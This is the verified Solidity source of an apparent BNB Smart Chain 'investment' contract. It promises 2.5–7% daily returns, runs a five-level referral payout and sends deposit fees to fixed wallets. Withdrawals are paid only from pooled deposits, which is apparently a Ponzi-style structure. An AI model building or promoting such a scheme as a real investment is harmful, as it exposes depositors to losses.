/**
 *Submitted for verification at BscScan.com on 2021-11-19
*/

// SPDX-License-Identifier: None

pragma solidity 0.6.12;

contract BNB_FACTOR_v3 {
    using SafeMath for uint256;

    uint256 public constant INVEST_MIN_AMOUNT = 1e16; // 0.01 BNB
    uint256[] public REFERRAL_PERCENTS = [70, 30, 15, 10, 5];
    uint256 public constant DEV_FEE = 40; // 4% * 2 = 8%
    uint256 public constant ASSOC_FEE = 5;
    uint256 public constant BUYBACK_FEE = 10;
    uint256 public constant MARKETING_FEE = 5;
    uint256 public constant PERCENT_STEP = 5;
    uint256 public constant PERCENTS_DIVIDER = 1000;
    uint256 public constant TIME_STEP = 1 days;
    uint256 public constant CUTOFF_STEP = 3 days;
    uint256 public constant WALLET_LIMIT = 5000 ether;

    uint256 public totalInvested;
    uint256 public totalRefBonus;

    mapping(uint8 => uint256) public numDeposits;
    mapping(uint8 => uint256) public amtDeposits;

    struct Plan {
      uint256 time;
      uint256 percent;
    }
    struct NC_Deposit {
      uint8 plan;
      uint256 amount;
      uint256 start;
    }
    struct C_Deposit {
      uint8 plan;
      uint256 amount;
      uint256 start;
      uint256 compoundExtension;
    }
    struct User {
      NC_Deposit[] ncDeposits;
      C_Deposit[] cDeposits;
      uint256 ncCheckpoint;
      uint256 cCheckpoint;
      uint256 cutoff;
      address referrer;
      uint256[5] levels;
      uint256 bonus;
      uint256 totalBonus;
      uint256 withdrawn;
      uint256 compounded;
    }

    Plan[] internal plans;
    mapping(address => User) internal users;

    bool public started;
    address payable public ceo1;
    address payable public ceo2;
    address payable public assocWallet;
    address payable public buybackWallet;
    address payable public marketingWallet;
    
    //ChainToken rewards
    CTN public ctn = CTN(0xCA45407b9584766daF405Ba9Efd23864F39f6bDe);
    uint256 public CTN_INVEST_REWARD = 100000 ether;
    uint256 public CTN_COMPOUND_REWARD = 20000 ether;
    uint256 public chainTokenRewards;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint256 amount);
    event Compound(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event Buyback(uint256 amount);

    constructor() public {
      ceo1 = msg.sender;
      ceo2 = 0xb939E94c1a5Bd991B6197a73e39FF2Ff6c86fbD4;
      assocWallet = 0xF2B08ee9AFC85EFFf3d3B793c7ad1b5790555537;
      buybackWallet = 0x78531128f6fB66F115e731bAcAc98310F983ce84;
      marketingWallet = 0xB159116d8E08f5De249768CADD77848FAAb9E387;

      plans.push(Plan(100, 25));
      plans.push(Plan(40, 70));
      plans.push(Plan(60, 65));
      plans.push(Plan(90, 60));
    }
    function init() public {
      require(msg.sender == ceo1, "You can't do that");
      started = true;
    }
    function buyBack() public payable {
      emit Buyback(msg.value);
    }
    function invest(address referrer, uint8 plan) public payable {
      require(started, "Too early");
      require(plan < 4, "Invalid plan");
      
      uint256 _amount = msg.value;
      require(_amount >= INVEST_MIN_AMOUNT, "Less than minimum amount");

      uint256 totalDeposits = getUserTotalDeposits(msg.sender);
      require(totalDeposits < WALLET_LIMIT, "Wallet limit reached (5,000 BNB)");

      numDeposits[plan] = numDeposits[plan] + 1;
      amtDeposits[plan] = amtDeposits[plan] + _amount;

      uint256 devFee = _amount.mul(DEV_FEE).div(PERCENTS_DIVIDER);
      uint256 devFee2 = devFee.div(2);
      uint256 assocFee = _amount.mul(ASSOC_FEE).div(PERCENTS_DIVIDER);
      uint256 buybackFee = _amount.mul(BUYBACK_FEE).div(PERCENTS_DIVIDER);
      uint256 marketingFee = _amount.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);

      ceo1.transfer(devFee2);
      ceo2.transfer(devFee.sub(devFee2));
      assocWallet.transfer(assocFee);
      buybackWallet.transfer(buybackFee);
      marketingWallet.transfer(marketingFee);

      User storage user = users[msg.sender];

      if (user.referrer == address(0)) {
        uint256 referrerAmountOfDeposits = getUserAmountOfDeposits(referrer);
        if (referrerAmountOfDeposits > 0 && referrer != msg.sender) {
          user.referrer = referrer;
        }
        address upline = user.referrer;
        for (uint256 i = 0; i < 5; i++) {
          if (upline != address(0)) {
            users[upline].levels[i] = users[upline].levels[i].add(1);
            upline = users[upline].referrer;
          } else {
            break;
          }
        }
      }

      if (user.referrer != address(0)) {
        address upline = user.referrer;
        for (uint256 i = 0; i < 5; i++) {
          if (upline != address(0)) {
            uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
            users[upline].bonus = users[upline].bonus.add(amount);
            users[upline].totalBonus = users[upline].totalBonus.add(amount);
            emit RefBonus(upline, msg.sender, i, amount);
            upline = users[upline].referrer;
          } else  {
            break;
          }
        }
      }

      uint256 userAmountOfDeposits = (user.ncDeposits.length).add(user.cDeposits.length);
      if (userAmountOfDeposits == 0) {
        user.ncCheckpoint = block.timestamp;
        user.cCheckpoint = block.timestamp;
        user.cutoff = block.timestamp.add(CUTOFF_STEP);
        emit Newbie(msg.sender);
      }
      
      if(plan > 0) {
        user.ncDeposits.push(NC_Deposit(plan, _amount, block.timestamp));
      } else {
        user.cDeposits.push(C_Deposit(plan, _amount, block.timestamp, 0));
      }

      totalInvested = totalInvested.add(_amount);
      ctn.mint(msg.sender, CTN_INVEST_REWARD);
      chainTokenRewards = chainTokenRewards.add(CTN_INVEST_REWARD);
      emit NewDeposit(msg.sender, plan, _amount);
    }
    function compound() public {
      uint256 compounded = 0;
      User storage user = users[msg.sender];
      uint256 endPoint = block.timestamp < user.cutoff ? block.timestamp : user.cutoff;

      for (uint256 i = 0; i < user.cDeposits.length; i++) {
	    uint256 finish = (user.cDeposits[i].start.add(plans[user.cDeposits[i].plan].time.mul(1 days))).add(user.cDeposits[i].compoundExtension);
		if (user.cCheckpoint < finish) {
	      uint256 share = user.cDeposits[i].amount.mul(plans[user.cDeposits[i].plan].percent).div(PERCENTS_DIVIDER);
		  uint256 from = user.cDeposits[i].start > user.cCheckpoint ? user.cDeposits[i].start : user.cCheckpoint;
		  uint256 to = finish < endPoint ? finish : endPoint;
		  if (from < to) {
		    uint256 compoundPeriod = to.sub(from);
		    uint256 compoundAmount = share.mul(compoundPeriod).div(TIME_STEP);
		    user.cDeposits[i].compoundExtension = user.cDeposits[i].compoundExtension.add(compoundPeriod);
		    user.cDeposits[i].amount = user.cDeposits[i].amount.add(compoundAmount);
		    user.compounded = user.compounded.add(compoundAmount);
            compounded = compounded.add(compoundAmount);
		  }
	    }
      }

      require(compounded > 0, "Nothing to compound");
      
      user.cCheckpoint = block.timestamp;
      if(user.ncDeposits.length == 0) {
        user.cutoff = block.timestamp.add(CUTOFF_STEP);
      }
      
      ctn.mint(msg.sender, CTN_COMPOUND_REWARD);
      chainTokenRewards = chainTokenRewards.add(CTN_COMPOUND_REWARD);
      
      emit Compound(msg.sender, compounded);
    }
    function withdraw() public {
      User storage user = users[msg.sender];
      uint256 divAmount = getUserDividends(msg.sender);
      uint256 referralBonus = getUserReferralBonus(msg.sender);
      
      uint256 totalAmount = divAmount;

      if (referralBonus > 0) {
        user.bonus = 0;
        totalAmount = totalAmount.add(referralBonus);
      }

      require(totalAmount > 0, "User has no dividends");

      uint256 contractBalance = address(this).balance;
      if (contractBalance < totalAmount) {
	    user.bonus = totalAmount.sub(contractBalance);
		user.totalBonus = user.totalBonus.add(user.bonus);
		totalAmount = contractBalance;
      }

      user.ncCheckpoint = block.timestamp;
      user.cCheckpoint = block.timestamp;
      user.cutoff = block.timestamp.add(CUTOFF_STEP);
      user.withdrawn = user.withdrawn.add(totalAmount);
      
      msg.sender.transfer(totalAmount);
      
      uint256 devFee = divAmount.mul(DEV_FEE).div(PERCENTS_DIVIDER);
      uint256 devFee2 = devFee.div(2);
      ceo1.transfer(devFee2);
      ceo2.transfer(devFee.sub(devFee2));
      
      emit Withdrawn(msg.sender, totalAmount);
    }
    function getContractBalance() public view returns (uint256) {
      return address(this).balance;
    }
    function getPlanInfo(uint8 plan) public view returns (uint256 time, uint256 percent) {
      time = plans[plan].time;
      percent = plans[plan].percent;
    }
    function getUserCDividends(address userAddress) public view returns (uint256) { 
      User storage user = users[userAddress];
      uint256 totalAmount = 0;
      uint256 endPoint = block.timestamp < user.cutoff ? block.timestamp : user.cutoff;

      for (uint256 i = 0; i < user.cDeposits.length; i++) {
	    uint256 finish = (user.cDeposits[i].start.add(plans[user.cDeposits[i].plan].time.mul(1 days))).add(user.cDeposits[i].compoundExtension);
		if (user.ncCheckpoint < finish) {
		  uint256 share = user.cDeposits[i].amount.mul(plans[user.cDeposits[i].plan].percent).div(PERCENTS_DIVIDER);
		  uint256 from = user.cDeposits[i].start > user.ncCheckpoint ? user.cDeposits[i].start : user.ncCheckpoint;
		  uint256 to = finish < endPoint ? finish : endPoint;
		  if (from < to) {
		    totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
		  }
		}
      }
      
      return totalAmount;
    }
    function getUserDividends(address userAddress) public view returns (uint256) {
      User storage user = users[userAddress];
      uint256 totalAmount = 0;

      uint256 endPoint = block.timestamp < user.cutoff ? block.timestamp : user.cutoff;

      for (uint256 i = 0; i < user.ncDeposits.length; i++) {
	    uint256 finish = user.ncDeposits[i].start.add(plans[user.ncDeposits[i].plan].time.mul(1 days));
		if (user.ncCheckpoint < finish) {
		  uint256 share = user.ncDeposits[i].amount.mul(plans[user.ncDeposits[i].plan].percent).div(PERCENTS_DIVIDER);
		  uint256 from = user.ncDeposits[i].start > user.ncCheckpoint ? user.ncDeposits[i].start : user.ncCheckpoint;
		  uint256 to = finish < endPoint ? finish : endPoint;
		  if (from < to) {
		    totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
		  }
		}
      }
      
      for (uint256 i = 0; i < user.cDeposits.length; i++) {
	    uint256 finish = (user.cDeposits[i].start.add(plans[user.cDeposits[i].plan].time.mul(1 days))).add(user.cDeposits[i].compoundExtension);
		if (user.cCheckpoint < finish) {
		  uint256 share = user.cDeposits[i].amount.mul(plans[user.cDeposits[i].plan].percent).div(PERCENTS_DIVIDER);
		  uint256 from = user.cDeposits[i].start > user.cCheckpoint ? user.cDeposits[i].start : user.cCheckpoint;
		  uint256 to = finish < endPoint ? finish : endPoint;
		  if (from < to) {
		    totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
		  }
		}
      }
      
      return totalAmount;
	}
    function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
      return users[userAddress].withdrawn;
    }
    function getUserNCCheckpoint(address userAddress) public view returns (uint256) {
      return users[userAddress].ncCheckpoint;
    }
    function getUserCCheckpoint(address userAddress) public view returns (uint256) {
      return users[userAddress].cCheckpoint;
    }
    function getUserReferrer(address userAddress) public view returns (address) {
      return users[userAddress].referrer;
    }
    function getUserDownlineCount(address userAddress) public view returns (uint256[5] memory referrals) {
      return (users[userAddress].levels);
    }
    function getUserTotalReferrals(address userAddress) public view returns (uint256) {
      return users[userAddress].levels[0] + users[userAddress].levels[1] + users[userAddress].levels[2] + users[userAddress].levels[3] + users[userAddress].levels[4];
    }
    function getUserReferralBonus(address userAddress) public view returns (uint256) {
      return users[userAddress].bonus;
    }
    function getUserReferralTotalBonus(address userAddress) public view returns (uint256) {
      return users[userAddress].totalBonus;
    }
    function getUserReferralWithdrawn(address userAddress) public view returns (uint256) {
      return users[userAddress].totalBonus.sub(users[userAddress].bonus);
    }
    function getUserAvailable(address userAddress) public view returns (uint256) {
      return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
    }
    function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
     return (users[userAddress].ncDeposits.length).add(users[userAddress].cDeposits.length);
    }
    function getUserAmountOfNCDeposits(address userAddress) public view returns (uint256) {
     return users[userAddress].ncDeposits.length;
    }
    function getUserAmountOfCDeposits(address userAddress) public view returns (uint256) {
     return users[userAddress].cDeposits.length;
    }
    function getUserTotalDeposits(address userAddress) public view returns (uint256 amount) {
      for (uint256 i = 0; i < users[userAddress].ncDeposits.length; i++) {
        amount = amount.add(users[userAddress].ncDeposits[i].amount);
      }
      for (uint256 i = 0; i < users[userAddress].cDeposits.length; i++) {
        amount = amount.add(users[userAddress].cDeposits[i].amount);
      }
    }
    function getUserNCTotalDeposits(address userAddress) public view returns (uint256 amount) {
      for (uint256 i = 0; i < users[userAddress].ncDeposits.length; i++) {
        amount = amount.add(users[userAddress].ncDeposits[i].amount);
      }
    }
    function getUserCTotalDeposits(address userAddress) public view returns (uint256 amount) {
      for (uint256 i = 0; i < users[userAddress].cDeposits.length; i++) {
        amount = amount.add(users[userAddress].cDeposits[i].amount);
      }
    }
    function getUserNCDepositInfo(address userAddress, uint256 index) public view returns (uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
      User storage user = users[userAddress];

      plan = user.ncDeposits[index].plan;
      percent = plans[plan].percent;
      amount = user.ncDeposits[index].amount;
      start = user.ncDeposits[index].start;
      finish = user.ncDeposits[index].start.add(plans[user.ncDeposits[index].plan].time.mul(1 days));
    }
    function getUserCDepositInfo(address userAddress, uint256 index) public view returns (uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
      User storage user = users[userAddress];

      plan = user.cDeposits[index].plan;
      percent = plans[plan].percent;
      amount = user.cDeposits[index].amount;
      start = user.cDeposits[index].start;
      finish = (user.cDeposits[index].start.add(plans[user.cDeposits[index].plan].time.mul(1 days))).add(user.cDeposits[index].compoundExtension);
    }
    function getUserInfo(address userAddress) public view returns (uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
      return (getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
    }
    function getUserCutoff(address userAddress) public view returns (uint256) {
      return users[userAddress].cutoff;
    }
    function getUserCompounded(address userAddress) public view returns (uint256) {
      return users[userAddress].compounded;
    }
    function isContract(address addr) internal view returns (bool) {
      uint256 size;
      assembly { size := extcodesize(addr) }
      return size > 0;
    }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a, "SafeMath: subtraction overflow");
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
        return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0, "SafeMath: division by zero");
    uint256 c = a / b;
    return c;
  }
}

interface CTN {
  function mint(address account,uint256 amount) external;
}